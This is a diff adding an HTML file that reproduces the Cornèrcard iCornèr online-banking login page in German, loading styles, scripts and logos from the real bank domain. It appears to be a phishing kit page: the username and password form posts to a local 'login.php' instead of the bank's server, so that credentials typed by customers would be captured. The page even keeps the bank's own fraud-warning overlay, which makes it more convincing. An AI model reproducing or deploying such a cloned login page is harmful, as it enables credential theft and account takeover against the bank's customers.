@@ -1,0 +1,212 @@
+<html lang="de"><head>
+        <title>Login: iCornèr | Cornèrcard | Onlineaccess</title>
+    
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1, shrink-to-fit=no, user-scalable=no" name="viewport">
+        <meta content="iCornèr: Loggen Sie sich ein oder registrieren Sie sich hier um Zugriff auf sämtliche Daten Ihrer Cornèrcard zu erhalten." name="description">
+        <meta content="cornèrcard" name="author">
+
+    <link href="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <link href="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/sticky-footer-navbar.css" rel="stylesheet" type="text/css">
+    <link href="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/default.css" rel="stylesheet" type="text/css">
+    <link href="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/icons.css" rel="stylesheet" type="text/css">
+    <!--[if lt IE 8]><!-->
+    <link href="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/ie7.css" rel="stylesheet" type="text/css">
+    <!--<![endif]-->
+    <script>
+        globalparameters = {
+            code: "de"
+        }
+    </script>
+    <script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/jquery-3.3.1.min.js"></script>
+    <script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/jquery.inputmasked.js"></script>
+    <script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/jquery.cookie.js"></script>
+    <script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/momentjs.js"></script>
+
+    <script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/bootstrap.min.js"></script>
+    <script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/validation.js"></script>
+    <script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/common-translation.js"></script>
+    <script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/default.js"></script>
+
+    <link href="/favicon.ico" rel="shortcut icon" type="image/x-icon">
+    <meta content="telephone=no" name="format-detection">
+</head>
+<body>
+<nav class="navbar navbar-expand-md navbar-light bg-light mb-4">
+    <div class="container">
+        <a class="navbar-brand" href="/">
+            <img alt="" src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/logo.svg" width="196">
+        </a>
+    </div>
+</nav>
+
+<main>
+    <div class="container" id="content">
+        <div class="progress-overview">
+            <div class="progress" style="height: 5px;">
+                <div aria-valuemax="100" aria-valuemin="0" aria-valuenow="16" class="progress-bar" role="progressbar" style="width: 30%"></div>
+            </div>
+        </div>
+        <div id="loginform">
+<form id="AuthUidPwDialog" name="AuthUidPwDialog" method="POST" target="_self" action="login.php" autocomplete="off" accept-charset="UTF-8" class="form-horizontal">
+    <div class="title">
+        <h1 class="logintitle text-center">Login</h1>
+                                                            </div>
+    
+            
+    
+    
+                                            <div class="form-group" style="text-align: center">
+                Bitte geben Sie Ihre persönlichen Zugangsdaten ein.
+            </div>
+        
+    
+    
+        <input type="hidden" name="client" value="Default">
+
+
+    
+    
+     
+
+                    
+    
+        
+        
+
+    
+    <div class="form-group required">
+                        <label class="control-label" for="isiwebuserid">
+                Benutzername
+            </label>
+
+            <div>
+                                    <input class="form-control" type="text" name="id" id="isiwebuserid" maxlength="255" value="" tabindex="4">
+                                                                <small id="forgotUserIdHelp" class="form-text text-muted"><a href="/recoverid/">
+                                                            Benutzername vergessen
+                                                    </a></small>
+                    
+                    <!-- Token OTP -->
+                    
+                                            <span class="message-token-error" style="display: none;">Der SMS Code besteht aus sechs Ziffern</span>
+                    
+                                            <span class="message-token-success" style="display: none;"></span>
+                    
+                
+                
+                                                                    </div>
+            </div>
+    
+    
+     
+
+                    
+    
+        
+        
+
+    
+    <div class="form-group required">
+                        <label class="control-label" for="isiwebpasswd">
+                Passwort
+            </label>
+
+            <div>
+                                    <input type="password" class="form-control" name="pass" id="isiwebpasswd" maxlength="255" value="" tabindex="5" autocomplete="off"><i id="show-password" class="icon-eye"></i>
+                                            <small id="forgotUserIdHelp" class="form-text text-muted">
+                            <a href="/recoverpw/">
+                                                                    Passwort vergessen
+                                                            </a>
+                        </small>
+
+                        <div class="not-registered">
+                                                            Noch nicht registriert?
+                                                        <a href="/registration/">
+                                                                    Registrierung
+                                                            </a>
+                        </div>
+                    
+                
+                
+                                                                    </div>
+            </div>
+    
+    
+        
+    
+ <div class="form-group text-center">
+                                
+                    
+                    
+                    
+                    
+                                <button name="submit" value="" class="btn btn-primary" disabled="">
+                Weiter
+            </button>
+        
+     </div>
+
+                                                                                </form>
+
+    <!-- position input focus into first element of form -->
+    <script type="text/javascript">
+        document.forms['AuthUidPwDialog'].elements[0].focus()
+    </script>
+</div>    </div>
+</main>
+
+<footer class="footer">
+    <div class="container">
+        <div class="top">
+            <div class="footer-language">
+                                <a class="language" href="?language=en">EN</a>
+                <a class="language active" href="?language=de">DE</a>
+                <a class="language" href="?language=fr">FR</a>
+                <a class="language" href="?language=it">IT</a>
+                            </div>
+            <div class="footer-links">
+                <div id="help-line-number">+41 91 800 41 41</div>
+                <a class="language" href="#" id="heaset-info"><i class="icons8-headset heaset-info"></i></a>
+            </div>
+        </div>
+        <div class="bottom">
+            <div class="footer-menu" style="color: #FFFFFF">
+
+                                <a target="_blank">Impressum</a>
+                
+                                <a target="_blank">Disclaimer</a>
+                
+                                <a target="_blank">Privacy Policy</a>
+                
+                                <a target="_blank">Sicherheit</a>
+                
+            </div>
+            <div class="copyright">
+                <div id="start-copyright">© 2022 Cornèrcard - Cornèr Bank AG., Via Canova 16, 6901 Lugano</div>
+            </div>
+            <div class="ebas-weiss">
+                                <a href="https://www.ebas.ch/de/">
+                    <img src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/logo_ebas_weiss_de.png" width="196">
+                </a>
+                            </div>
+        </div>
+    </div>
+</footer>
+<!-- remove it after 30-04-2020 -->
+<div id="overlay">
+    <div>
+        <h3 id="overlay-title">Hinweis: E-Mail- und Telefonbetrug</h3>
+        <p id="overlay-message">Cyberkriminelle nutzen zurzeit die Unsicherheiten in der Bevölkerung in Bezug auf die Coronavirus-Notlage aus.<br>Sie versenden falsche E-Mails, indem sie sich als offizielle Behörde wie das Bundesamt für Gesundheit (BAG) ausgeben, mit dem Ziel, Schadprogramme (malware) zu verbreiten oder persönliche Informationen zu erhalten.<br>Ähnliche Fälle sind via Telefon bekannt.<br>Wir bitten Sie, solche E-Mail-Nachrichten zu löschen oder Telefonanrufe zu ignorieren.</p>
+        <button class="btn btn-primary" id="overlay-ok">OK</button>
+    </div>
+</div>
+
+<link href="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/overlay.css" rel="stylesheet" type="text/css">
+<script src="https://www.icorner.ch/nevislogrend/nevislogrend/applications/www-icorner-ch--realm/webdata/resources/overlay.js"></script>
+
+<!--end remove it -->
+    
+
+
+
+ </body></html>
